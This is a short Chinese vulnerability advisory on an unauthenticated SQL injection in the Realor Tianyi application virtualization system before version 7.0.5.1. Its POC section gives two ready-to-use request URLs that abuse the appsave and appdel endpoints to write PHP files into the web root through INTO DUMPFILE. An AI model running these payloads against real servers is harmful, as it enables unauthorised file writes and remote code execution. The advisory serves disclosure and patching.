#  漏洞预警 | 瑞友天翼应用虚拟化系统SQL注入漏洞   
原创 lalone  浅安安全   2024-05-13 07:00  
  
**0x00 漏洞编号**  
- # 暂无  
  
**0x01 危险等级**  
- 高危  
  
**0x02 漏洞概述**  
  
瑞友天翼应用虚拟化系统是基于云计算技术的应用虚拟化解决方案，可以帮助用户实现应用的快速部署和管理。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/7stTqD182SUXzkIS3UCiaMBXoe3QHiaR40tfl7H16YMjwnToL6UymHDWN1GdEIaQiajIq4O8ibKbhFVkYibiabRZk4Qg/640?wx_fmt=png&from=appmsg "")  
  
**0x03 漏洞详情**  
###   
###   
  
**漏洞类型：**  
SQL注入  
  
  
**影响：**  
  
获取敏感信息  
  
**简述：**  
瑞友天翼应用虚拟化系统中的\Home\Controller\AdminController存在appsave/appdel两个无需鉴权并且存在SQL注入的风险的接口，未授权的攻击者可利用此漏洞获取敏感信息，由于默认未通过secure_file_priv配置限制mysql写入文件路径，攻击者可利用此漏洞读写本地任意文件，从而远程执行任意代码。  
###   
  
**0x04 影响版本**  
- 瑞友天翼应用虚拟化系统 < 7.0.5.1  
  
**0x05****POC**  
```
{URL}/hmrao.php?s=/Admin/appsave&appid=11111111%27);select+%27%3C%3fphp+echo+md5(11111111)%3f%3E%27+into+dumpfile+%27../../WebRoot/11122222.php%27%3b--+</

{URL}/hmrao.php?s=/Admin/appdel&list=11111111'));select+'<%3fphp+echo+md5(123)%3f>'+into+dumpfile+'../../WebRoot/1234.php'%3b--+
```  
  
**仅供安全研究与学习之用，若将工具做其他用途，由使用者承担全部法律及连带责任，作者及发布****者**  
**不承担任何法律及连带责任。**  
  
**0x06****修复建议**  
  
**目前官方已发布漏洞修复版本，建议用户升级到安全版本****：**  
  
http://www.realor.cn/  
  
  
  
